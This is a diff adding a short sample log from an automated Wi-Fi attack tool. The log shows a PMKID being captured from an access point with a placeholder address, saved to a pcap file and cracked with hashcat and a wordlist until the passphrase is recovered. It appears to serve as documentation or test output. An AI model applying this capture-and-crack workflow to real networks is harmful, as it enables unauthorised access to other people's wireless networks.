@@ -1,0 +1,11 @@
+[+] (1/1) Starting attacks against DE:AD:BA:BE:00:01 (so-smart)
+[+] so-smart (58db) PMKID CAPTURE: Waiting for PMKID (1m18s)
+[+] so-smart (60db) PMKID found: 0123456789abcdef0123456789abcdef
+[+] saving copy of PMKID to hs/pmkid_sosmart_DE-AD-BA-BE-01_2024-06-
+06T17-42-05.pcap saved
+[+] analysis of captured PMKID file:
+[+] hashcat: .pcap file contains a valid PMKID for de:ad:ba:be:01
+[+] Cracking PMKID: Running hashcat with wordlist-probable.txt wordlist
+[+] Cracking PMKID: 100.00% ETA: 0s @ 2635.0kps (current key: 02051975)
+[+] Cracked PMKID PSK: lukrecja-szmaragdy-45
+[...]
